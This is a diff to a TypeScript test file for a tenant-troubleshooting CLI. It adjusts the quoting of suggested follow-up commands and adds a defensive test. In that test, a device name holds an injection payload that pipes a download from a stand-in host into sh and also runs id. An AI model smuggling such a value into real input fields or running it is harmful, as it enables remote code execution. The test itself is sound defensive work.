@@ -61,7 +61,13 @@ describe('sign-in analysis', () => {
     );
     const findings = signinFindings(analysis, UPN);
     expect(findings).toHaveLength(1);
-    expect(findings[0]?.next).toBe('tenantctl troubleshoot device "LAPTOP-7"');
+    expect(findings[0]?.next).toBe('tenantctl troubleshoot device LAPTOP-7');
+  });
+
+  test('a device name with shell syntax is quoted so a `next` command cannot run it', () => {
+    const name = 'Bob$(curl evil|sh)`id`';
+    const analysis = analyzeSignins([signin(1, 53000, { deviceDetail: { displayName: name } })], 7, false);
+    expect(signinFindings(analysis, UPN)[0]?.next).toBe(`tenantctl troubleshoot device 'Bob$(curl evil|sh)\`id\`'`);
   });
 
   test('wrong passwords from many IPs are flagged as possible password spray', () => {
@@ -169,7 +175,7 @@ describe('troubleshoot user', () => {
     expect(result.findings.find((f) => f.area === 'sign-in')?.detail).toContain('Blocked by: Block unmanaged');
     expect(result.findings).toContainEqual(expect.objectContaining({ area: 'mfa', severity: 'medium' }));
     expect(result.findings).toContainEqual(
-      expect.objectContaining({ area: 'devices', next: 'tenantctl troubleshoot device "LAPTOP-7"' }),
+      expect.objectContaining({ area: 'devices', next: 'tenantctl troubleshoot device LAPTOP-7' }),
     );
     expect(result.verdict).toStartWith(
       `${result.findings.filter((f) => f.severity === 'high' || f.severity === 'medium').length} problems for ${UPN}: Account is disabled`,
@@ -277,10 +283,10 @@ describe('troubleshoot device', () => {
     const byArea = Object.fromEntries(result.findings.map((f) => [f.area, f]));
     expect(byArea.compliance).toMatchObject({
       severity: 'high',
-      next: 'tenantctl intune devices compliance "LAPTOP-7"',
+      next: 'tenantctl intune devices compliance LAPTOP-7',
     });
     expect(byArea.compliance?.detail).toContain('"Windows baseline" fails BitLocker (current value false)');
-    expect(byArea.sync).toMatchObject({ severity: 'medium', next: 'tenantctl intune devices sync "LAPTOP-7"' });
+    expect(byArea.sync).toMatchObject({ severity: 'medium', next: 'tenantctl intune devices sync LAPTOP-7' });
     expect(byArea.entra).toMatchObject({
       severity: 'high',
       issue: 'Device is disabled in Entra ID',
